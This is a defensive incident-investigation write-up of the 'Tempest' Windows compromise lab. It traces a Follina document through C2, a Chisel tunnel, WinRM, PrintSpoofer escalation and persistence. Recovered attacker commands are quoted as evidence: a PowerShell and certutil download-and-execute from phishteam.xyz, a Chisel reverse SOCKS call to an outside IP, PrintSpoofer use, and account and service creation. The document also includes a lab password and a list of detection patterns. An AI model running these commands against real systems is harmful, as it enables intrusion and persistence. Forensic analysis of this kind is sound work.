Tempest: Thinking Like a SOC Analyst During a Full Windows Compromise

This writeup is not only a list of answers. I documented what I saw, what I thought it meant, why I pivoted to the next artifact, and how I separated evidence from assumptions while investigating the Tempest workstation.

Executive Summary

The Tempest workstation was compromised when TEMPEST\benimaru opened free_magicules.doc, a malicious Word document. The document loaded content from phishteam.xyz and triggered an MSDT/Follina execution chain associated with CVE-2022-30190. The embedded payload was base64-encoded and decoded to a PowerShell command that downloaded update.zip and extracted it into the user's Startup folder.

When the user logged in again, the staged payload launched PowerShell, used certutil.exe to download first.exe, and executed it from C:\Users\Public\Downloads. The stage 2 payload established HTTP C2 to resolvecyber.xyz:80. Its protocol used GET requests to /9ab62b5, placed base64-encoded command output in the q parameter, and used the Nim httpclient/1.6.6 User-Agent.

Decoded C2 traffic revealed that the attacker discovered automation.ps1 and recovered the password infernotempest. They enumerated WinRM on port 5985, used Chisel to create a reverse SOCKS proxy, authenticated over WinRM, downloaded spf.exe, identified as PrintSpoofer, and abused SeImpersonatePrivilege to execute C:\ProgramData\final.exe. With SYSTEM-level access, they created users shion and shuna, added shion to Administrators, and created the auto-start service TempestUpdate2 for persistence.

free_magicules.doc → WINWORD.EXE → MSDT/Follina → Startup payload → first.exe → HTTP C2 → credential discovery → Chisel SOCKS → WinRM → PrintSpoofer → final.exe → accounts + service persistence

SOC Analyst Mindset

When I investigate a case like this, I try not to jump directly to the final answer. A SOC analyst's job is to explain why something is suspicious and prove the path the attacker took. My thinking during this room was:

  • Start from a known entry point. The scenario mentioned a malicious document, so the first question was: which document, which user, and did it actually execute?
  • Do not trust one event alone. A file path can be misleading. I wanted process creation, DNS, PCAP, and decoded payload evidence to line up.
  • Follow cause and effect. If Word launched MSDT, then I checked what MSDT executed. If a payload wrote into Startup, then I checked what ran after login. If a C2 channel returned command output, I decoded it and asked what attacker goal it supported.
  • Think in attacker objectives. Initial access was not the end. I looked for staging, discovery, credential access, tunneling, privilege escalation, and persistence.
  • Write evidence as a story. The final report should let another analyst reproduce my reasoning without needing to guess what I saw.

1. Evidence Preparation

I started with the hashes of the provided artifacts. This is not glamorous, but it gives confidence that the evidence being analyzed is the expected evidence. In a real SOC or DFIR case, this helps with chain of custody and repeatability.

capture.pcapng  CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6

What I saw: three primary artifacts: a packet capture, a Sysmon EVTX, and a Windows Security EVTX.
What I thought: Sysmon would tell me process/file/network behavior, Windows Security would confirm account activity, and the PCAP would validate external communication.
Next pivot: parse Sysmon first because the scenario begins with host execution.

2. Initial Access: Identifying the Malicious Document

The scenario pointed to a malicious document downloaded by the user. In Timeline Explorer, I searched for document extensions and suspicious file creation events. The file free_magicules.doc appeared under C:\Users\benimaru\Downloads.

What I saw: a Word document in the Downloads folder.
What I thought: Downloads is consistent with user-initiated initial access, but the file existing on disk is not enough. I needed proof that the user opened it and that it caused execution.
Next pivot: search for WINWORD.EXE and references to free_magicules.doc.

Word execution confirmed that the user opened the document. The compromised identity was TEMPEST\benimaru, and the hostname was TEMPEST.

The Word process that opened the malicious document had PID 496. Additional Trusted Document registry events supported that Word interacted with the same file.

3. Follina / MSDT: Understanding the Execution Vector

The next question was: how did the document execute code? Searching around the Word process timeline revealed msdt.exe with the ms-msdt: protocol handler. This immediately stood out because malicious Office documents abusing MSDT are strongly associated with Follina.

What I saw: msdt.exe ms-msdt:/id PCWDiagnostic and an obfuscated Invoke-Expression chain.
What I thought: this is not normal Word behavior. The ms-msdt: protocol plus Office context points to Follina-style remote code execution.
Next pivot: extract and decode the base64 payload to understand what the exploit actually ran.

The base64 payload decoded to a PowerShell command that changed directory into the Startup folder, downloaded update.zip, extracted it, and removed the ZIP file.

$app=[Environment]::GetFolderPath('ApplicationData');
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup";
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip;
Expand-Archive .\update.zip -DestinationPath .;
rm update.zip;

This told me the exploit was not only executing code once. It was preparing persistence through the Startup folder so another command would run after the user logged in.

4. Stage 2: Startup Execution and first.exe

After decoding the Startup payload, I expected to find a later execution chain with explorer.exe as the parent process because user Startup folder items normally run after login under the user's session.

The executed command was:

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
What I saw: hidden PowerShell running certutil -urlcache -split -f to download an EXE and then execute it.
What I thought: PowerShell is the orchestrator and certutil is being used as a LOLBin for payload transfer. The download location C:\Users\Public\Downloads is suspicious because it is writable and convenient for staging.
Next pivot: verify the payload hash, DNS resolution, and PCAP traffic for the domain.

The SHA256 hash for the stage 2 binary was:

CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8

5. Network Traffic: Proving the C2 Channel

Endpoint evidence showed execution, but network evidence was needed to understand command and control. Sysmon DNS events showed first.exe querying resolvecyber.xyz, and the PCAP confirmed HTTP traffic to port 80.

Before focusing only on first.exe, I also checked the original document network traffic. Brim showed Word fetching http://phishteam.xyz/02dcf07/index.html. That connected the document directly to the malicious infrastructure.

What I saw: Word made a request to phishteam.xyz, and first.exe later communicated with resolvecyber.xyz.
What I thought: these are different phases. phishteam.xyz is staging infrastructure, while resolvecyber.xyz is the C2 endpoint for the stage 2 binary.
Next pivot: inspect the HTTP URI format to understand how commands and results were exchanged.

The C2 used HTTP GET requests to /9ab62b5. The q parameter contained base64-encoded command output. After decoding it, I could read command results directly.

The User-Agent Nim httpclient/1.6.6 explained the programming language answer: nim.

6. Discovery and Credential Access

Once I understood the C2 format, I decoded more q values. This is where the investigation shifted from malware execution to attacker objectives. One decoded command output showed the attacker reading C:\Users\Benimaru\Desktop\automation.ps1.

$user = "TEMPEST\benimaru"
$pass = "infernotempest"
What I saw: plaintext credentials in a PowerShell automation script.
What I thought: this is a credential access event. The attacker now has a password and will likely try to use it against a remote management service.
Next pivot: look for listening port enumeration and remote service usage.

Decoded traffic showed listening port enumeration. Port 5985 stood out because it is associated with WinRM. In the context of recovered credentials, this was a strong clue that the attacker would authenticate over WinRM.

7. Reverse SOCKS Proxy and WinRM Authentication

The attacker then executed a Chisel command to establish a reverse SOCKS proxy. The command connected back to 167.71.199.191:8080 and used R:socks, which is typical Chisel syntax for reverse SOCKS.

C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
What I saw: Chisel reverse SOCKS was executed after port discovery and credential discovery.
What I thought: the attacker needed network reachability to an internal service. Because port 5985 was discovered, WinRM became the most likely authentication target.
Conclusion: the succeeding service used to authenticate was winrm.

8. Privilege Escalation with PrintSpoofer

After gaining remote access, the attacker downloaded another binary named spf.exe. The filename alone was not enough to identify it, so I relied on the SHA256 hash and VirusTotal enrichment.

spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D

VirusTotal identified the binary as PrintSpoofer. That changed how I interpreted the privilege escalation phase: PrintSpoofer is associated with abusing SeImpersonatePrivilege. The command then executed final.exe:

C:\Users\benimaru\Downloads\spf.exe -c C:\ProgramData\final.exe
What I saw: spf.exe was identified as PrintSpoofer and launched final.exe.
What I thought: this was the transition from a normal user context into elevated execution. The new payload should have different process context and possibly a different C2 connection.
Next pivot: search for final.exe network connections and child processes.

The elevated C2 binary was final.exe, and its C2 port was 8080, different from the first C2 connection on port 80.

9. Fully Owned Machine: Account and Service Persistence

After SYSTEM access, malicious commands began blending into the NT AUTHORITY\SYSTEM context. I focused on child process activity after final.exe, especially net.exe, net1.exe, and sc.exe.

The attacker created two users: shion and shuna. The earlier failed creation attempts were missing the /add option. Windows Event ID 4720 confirmed successful account creation.

net localgroup administrators /add shion

Windows Event ID 4732 confirmed that a member was added to a security-enabled local group. This was privilege persistence because shion became a local administrator.

C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
What I saw: sc.exe created TempestUpdate2 with start= auto and binpath= C:\ProgramData\final.exe.
What I thought: this is service-based persistence. Even if the current C2 session dies, Windows can relaunch final.exe when the service starts.

Remediation Recommendations

  • Isolate the Tempest workstation and preserve forensic artifacts before reimaging.
  • Reset benimaru's password and remove attacker-created users shion and shuna.
  • Remove malicious files including first.exe, ch.exe, spf.exe, and C:\ProgramData\final.exe.
  • Delete the TempestUpdate2 service and inspect Startup folder entries.
  • Block or monitor phishteam.xyz, resolvecyber.xyz, 167.71.199.191, and the observed HTTP paths.
  • Harden WinRM access and restrict port 5985 to trusted administration hosts.
  • Audit scripts and configuration files for plaintext credentials.
  • Create detections for msdt.exe ms-msdt:, certutil -urlcache, Chisel R:socks, PrintSpoofer execution, and suspicious sc.exe create commands.

Conclusion

The strongest part of this investigation was correlation. The malicious document was confirmed through file creation, Word execution, registry activity, MSDT execution, DNS resolution, and PCAP traffic. The stage 2 and post-exploitation phases were confirmed through Sysmon command lines, decoded C2 output, hash enrichment, Windows Security events, and service creation evidence. By following the evidence instead of guessing, the full chain became clear: document execution, staged C2, credential discovery, reverse proxying, WinRM access, privilege escalation, and persistence.
